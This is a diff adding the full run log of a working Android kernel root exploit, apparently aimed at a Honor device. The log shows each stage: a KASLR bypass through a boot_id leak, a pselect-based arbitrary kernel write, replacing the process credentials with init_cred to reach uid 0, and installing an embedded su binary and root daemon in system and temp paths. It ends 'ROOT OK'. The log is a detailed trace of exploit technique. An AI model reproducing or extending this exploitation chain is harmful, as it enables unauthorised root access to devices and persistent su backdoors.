@@ -1,0 +1,79 @@
+runner pid=64172 serial=AVXB6R5C19000481 so=/data/local/tmp/preload_honor_bootidfix.so
+challenge=babbrr1ozfkbq4nb
+signature sent; ADB dark window=120s
+Analysis
+[Challenge] babbrr1ozfkbq4nb
+[Signature] Enter value: password verify ok
+[+] preload starting pid=13384
+[+] runtime performance cpu=7 max_freq=4608000 capacity=1024
+[+] startup pid=13384 uid=2000 attr=u:r:shell:s0 enforce=0 direct_cpu=7
+[*] slide ktext calibrated base=ffffffd428600000 cpu=0 sites=ad73f0,ccc2fc
+[*] slide attempt 1 uses pselect shift=12
+[+] slide child pid=17899 uid=2000 direct_cpu=7
+[*] slide pselect setup shift=12 page=ffffff8ab7a00000 fake_lock=ffffff8ab7a004d0 fake_w0=ffffff8ab7a013a0 fake_task=ffffff8ab7a02380
+[*] slide res readiness installed=131
+[*] slide res enc in=0000000000000082 0000000000000000 ffffffd42a9e20e0 0000000000000000 ffffffd42ab0b558 out=0000000000000082 0000000000000000 ffffffd42a9ecf00 ffffff8ab7a004d0 0000000000000003 ex=0000000000000000 0000000000000000 ffffffd42a9e20e0 nready=131
+[*] slide pselect before syscall
+[*] slide consumer before tgkill tid=17900 calls=1
+[*] slide consumer before sched tid=17900 alive_ret=0 alive_errno=0
+[*] slide consumer sched tid=17900 alive_ret=0 alive_errno=0 sched_ret=0 sched_errno=0
+[*] slide pselect returned ret=169 errno=0 calls=1 sched_ok=1 last_sched_ret=0 last_sched_errno=0
+[+] slide boot_id_leaked_nfulnl_logger pid=17899 value=ffffffd42a9e2198 stext=ffffffd428600000
+[+] slide boot_id-derived_stext pid=17899 value=ffffffd428600000
+[+] slide-kaslr-ok pid=13384 base=ffffffd428600000 slide=00000013a8600000
+[*] slide generation released before direct stage
+[+] direct mode=init_cred runtime_cpu=7
+[+] direct-step direct_root_enter uid=2000 pid=13384
+[+] direct-root-parent cpu=7 pid=13384 tid=13384
+[+] direct-r64-plan name=per_cpu_offset attempt=1/3 idx=0 shape=0 cpu=7 pid=13384 tid=13384 B=ffffffd42ab0b558 Q=ffffffd42a9db848 Q8=ffffffd42a9db850 Q16=ffffffd42a9db858
+[+] direct-w64[0] target=ffffffd42ab0b558 value=ffffffd42a9db848 shape=0 workspace=ffffff8ab7648000
+[*] pselect res prepare attempt=1 page=ffffff8ab7648000 target=ffffffd42ab0b558 value=ffffffd42a9db848
+[*] pselect res readiness attempt=1 installed=140
+[*] pselect res attempt=1 ret=172 errno=0 calls=1 success=1 installed=140
+[+] direct-r64-oracle name=per_cpu_offset attempt=1 idx=0 shape=0 cpu_before=7 cpu_after_trigger=7 cpu_after_read=7 value=ffffffb73d21d000 sidecar=ffffffd42ab0b558 expected_sidecar=ffffffd42ab0b558 raw8=58 expected_raw8=58 ok=1
+[+] direct-percpu cpu=7 base=ffffffd42a9db810 slot=ffffffd42a9db848 delta=ffffffb73d21d000 page_aligned=1 entry_slot=ffffff8b67baf400 direct=1 aligned=1
+[+] direct entry_slot=ffffff8b67baf400 cpu=7 delta=ffffffb73d21d000
+[+] direct-r64-plan name=entry_task attempt=1/3 idx=1 shape=0 cpu=7 pid=13384 tid=13384 B=ffffffd42ab0b558 Q=ffffff8b67baf400 Q8=ffffff8b67baf408 Q16=ffffff8b67baf410
+[+] direct-w64[1] target=ffffffd42ab0b558 value=ffffff8b67baf400 shape=0 workspace=ffffff8ab4dd8000
+[*] pselect res prepare attempt=1 page=ffffff8ab4dd8000 target=ffffffd42ab0b558 value=ffffff8b67baf400
+[*] pselect res readiness attempt=1 installed=139
+[*] pselect res attempt=1 ret=175 errno=0 calls=1 success=1 installed=139
+[+] direct-r64-oracle name=entry_task attempt=1 idx=1 shape=0 cpu_before=7 cpu_after_trigger=7 cpu_after_read=7 value=ffffff88f1779640 sidecar=ffffffd42ab0b558 expected_sidecar=ffffffd42ab0b558 raw8=58 expected_raw8=58 ok=1
+[+] direct-entry cpu=7 observed_cpu=7 slot=ffffff8b67baf400 task=ffffff88f1779640 direct=1 aligned=1 pid=13384 tid=13384
+[+] direct entry sample task=ffffff88f1779640 pid=13384 cpu=7
+[+] direct pre-cred selinux preserved enforcing=0
+[+] direct-step before_init_cred uid=2000 pid=13384 task=ffffff88f1779640
+[+] direct-step install_real_cred attempt=1/3 target=ffffff88f1779f38 value=ffffffd42aa02cb0
+[+] direct-w64[2] target=ffffff88f1779f38 value=ffffffd42aa02cb0 shape=1 workspace=ffffff8a67290000
+[*] pselect res prepare attempt=1 page=ffffff8a67290000 target=ffffff88f1779f38 value=ffffffd42aa02cb0
+[*] pselect res readiness attempt=1 installed=102
+[*] pselect res attempt=1 ret=168 errno=0 calls=1 success=1 installed=102
+[+] direct-step install_cred_then_selinux_zero target=ffffff88f1779f40 value=ffffffd42aa02cb0 followup=ffffffd42ac663c8
+[+] direct-w64[3] target=ffffff88f1779f40 value=ffffffd42aa02cb0 shape=1 workspace=ffffff8ac7f98000
+[*] pselect res prepare attempt=1 page=ffffff8ac7f98000 target=ffffff88f1779f40 value=ffffffd42aa02cb0
+[*] pselect res readiness attempt=1 installed=108
+[*] pselect res attempt=1 ret=177 errno=0 calls=1 success=1 installed=108
+[+] direct-w64[4] target=ffffffd42ac663c8 value=ffffff8ac7f98100 shape=1 workspace=ffffff8ac4740000
+[*] pselect res prepare attempt=1 page=ffffff8ac4740000 target=ffffffd42ac663c8 value=ffffff8ac7f98100
+[*] pselect res readiness attempt=1 installed=97
+[*] pselect res attempt=1 ret=163 errno=0 calls=1 success=1 installed=97
+[+] direct-step restore_boot_id_ctl_data attempt=1/3 target=ffffffd42ab0b558 value=ffffffd42ac87770
+[+] direct-w64[7] target=ffffffd42ab0b558 value=ffffffd42ac87770 shape=1 workspace=ffffff8ac2080000
+[*] pselect res prepare attempt=1 page=ffffff8ac2080000 target=ffffffd42ab0b558 value=ffffffd42ac87770
+[*] pselect res readiness attempt=1 installed=100
+[*] pselect res attempt=1 ret=160 errno=0 calls=1 success=1 installed=100
+[+] boot_id ctl_table.data restored=ffffffd42ac87770
+[*] direct selinux policy reload skipped (default)
+[+] direct credential result uid=0 euid=0 gid=0 egid=0 task=ffffff88f1779640 init_cred=ffffffd42aa02cb0 selinux=0->0 policy_reload=0
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+[+] embedded su wrote 15312 bytes to /apex/com.android.virt/bin/su
+[+] embedded su wrote 15312 bytes to /data/local/tmp/su
+[*] local su client install ok=1 path=/data/local/tmp/su
+[+] embedded su wrote 15312 bytes to /apex/com.android.virt/bin/su
+[*] adb-visible su install adbd=6572 ok=1 path=/apex/com.android.virt/bin/su
+[+] embedded su daemon ready pid=18730 socket=/data/local/tmp/temp_su.sock
+[+] direct-root-summary root=1 id=1 su=1/2 daemon=18730 selinux=0->0 uid=0 euid=0 gid=0 egid=0
+EXITCODE=0
+
+RESULT: ROOT OK
+saved_log=runs/exploit_bootidfix.full.log
